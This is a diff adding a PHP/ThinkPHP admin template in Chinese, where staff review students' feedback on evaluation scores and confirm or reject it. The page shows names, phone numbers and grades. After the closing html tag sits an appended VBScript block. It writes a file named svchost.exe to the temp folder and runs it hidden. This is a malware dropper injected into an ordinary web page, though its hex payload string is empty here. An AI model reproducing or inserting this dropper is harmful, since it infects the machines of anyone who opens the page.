@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+<head> 
+<meta charset="utf-8"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>反馈</title>
+
+ <link rel="stylesheet" type="text/css" href="__STATIC__/admin/css/fankui.css"/>
+ <script type="text/javascript" src="__STATIC__/admin/js/fankui.js"></script>
+<head>
+<style>
+#te1{
+	width:681px;
+	min-height:110px;
+	left:10px;
+	background-color:#ededed;
+	 /*实现div中文字自动换行*/
+}
+.b_css1{
+	background-color:#19966A;
+	color:white;
+	width:100px;
+	height:30px;
+	font-size:16px;
+	border:none;
+	border-radius:3px;
+}
+#but2{
+	position:absolute;
+	left:83%;
+	top:30px;
+}
+.new{
+	text-align: left;
+	vertical-align: top;
+}
+</style>
+<body  style="background-color:#EDEDED;">
+		<div id='ding'>
+		<center>
+		<form action="{:url('index/index/fankuia')}" method="post">
+			<input type="text" name="xh" placeholder="请输入查询学号">
+			<input type="submit" name="" value="检索">
+		</form>
+		</center>
+	</div>
+	<!--<button class='b_css1' id='but1'>确认</button>-->
+	<a href="__STATIC__/muban/信息技术学院综合素质测评方法.pdf"><button class='b_css1'  id='but2'>考核办法</button></a>
+	<?php
+use app\admin\model\Fankui;
+use app\admin\model\Student;
+$fankui = new Fankui;
+$student = new Student;
+?>
+{volist name='fan' id='vo' empty="<center><h1>暂无未处理反馈！</h1></center>"}
+
+
+
+	<table bgcolor="white" align="center" width="1159px" >
+		<tr height='40px'>
+			<td valign="center" width="250px" valign="bottom" >{$vo.student_id}同学的反馈</td>
+			<td></td>
+			<td></td>
+		</tr>
+
+		<tr>
+			<td colspan="3" ><hr width='1180px' noshade="noshade" style=" background:#c1c1c1;        
+       border: none;        
+       height: 1px; "   ></td>
+		</tr>
+
+		<tr >
+			<?php
+            $path = '__STATIC__'.$vo['jpg'];
+			?>
+			<td  valign="center"><img src="{$path}" class='fkt'/></td>
+            <?php
+            $n = $student ->where('student_id',$vo['student_id'])->find();
+            $name = $n['student_name'];
+            ?>
+			<td width="681px"  valign="top">
+				<div id='te1'>
+					<center>
+						<table width="640px">
+							<tr>
+								<td class="new" width="120px" height="40px"><br/>姓名：{$name}</td>
+								<td class="new" width="200px"><br/>手机：{$vo.phone}</td>
+								<td class="new"></br>反馈时间：{$vo.create_time}</td>
+							</tr>
+							<tr>
+								<td class="new" height="40px"><br />分数：{$vo.grade}</td>
+								<td class="new"><br />三级指标：{$vo.com_id}</td>
+								<td class="new"><br /> 活动名称：{$vo.act_name}</td>
+							</tr>
+							<tr>
+								<td class="new" colspan="3"></br>原因：{$vo.act_script}</td>
+							</tr>
+						</table>
+					</center>
+
+						<br />
+		
+
+				</div> 
+			</td>
+
+			<td  valign="top"><br/><br/><br/>
+				<a href="{:url('admin/index/queren')}?id={$vo.aaa}">
+					<button class='b_css1'>确认</button>
+				</a><br/><br/><br/>
+
+				<a href="{:url('admin/index/fou')}?id={$vo.aaa}">
+					<button class='b_css1'>否决</button>
+				</a>
+			</td>
+		</tr>
+		
+		<tr>
+			<td colspan="3"> 
+				<br>
+					<hr width='0px' style="border: 0; background-color: gray; height: 1px" />
+			</td>
+		</tr>
+	</table>
+	<p/>
+
+
+{/volist}
+</body> 
+  </html><SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
